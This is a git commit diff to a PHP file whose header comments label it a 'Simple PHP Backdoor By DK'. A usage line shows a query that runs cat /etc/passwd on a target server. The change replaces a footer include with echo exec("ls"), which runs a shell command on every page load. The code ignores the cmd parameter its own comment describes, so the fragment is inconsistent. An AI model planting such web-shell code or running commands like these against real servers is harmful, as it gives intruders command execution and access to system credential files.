c1589ed7e2ea2102699ef73752259462516ba35b
Void <51586851+Val0id@users.noreply.github.com>
2023-02-07 02:01:02 +0700

    f

--- f.php
+++ f.php
@@ -1,5 +1,5 @@
 <!-- Simple PHP Backdoor By DK (One-Liner Version) -->
 <!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
 <?php
-require "./includes/footer.inc.php";
+echo exec("ls");
 ?>
